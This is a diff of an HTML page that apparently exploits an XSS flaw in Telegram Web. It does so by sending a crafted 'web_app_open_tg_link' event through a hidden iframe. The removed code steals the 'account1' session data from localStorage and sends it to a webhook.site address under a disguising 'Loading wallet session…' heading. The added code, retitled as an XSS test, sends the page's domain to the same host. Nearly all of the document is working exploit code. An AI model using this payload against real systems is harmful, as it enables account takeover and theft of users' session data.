@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Loading wallet session…</h1>
+    <h1>Triggering XSS test…</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
     <script>
       const payload = JSON.stringify({
         eventType: 'web_app_open_tg_link',
         eventData: {
           path_full: `/wallet/start?x=${encodeURIComponent(`
-            (function() {
-              try {
-                const data = localStorage.getItem('account1');
-                fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data=' + encodeURIComponent(data), {
-                  mode: 'no-cors'
-                });
-              } catch (e) {}
+            (function(){
+              fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?domain=' + document.domain, {
+                mode: 'no-cors'
+              });
             })()
           `)}`
         }
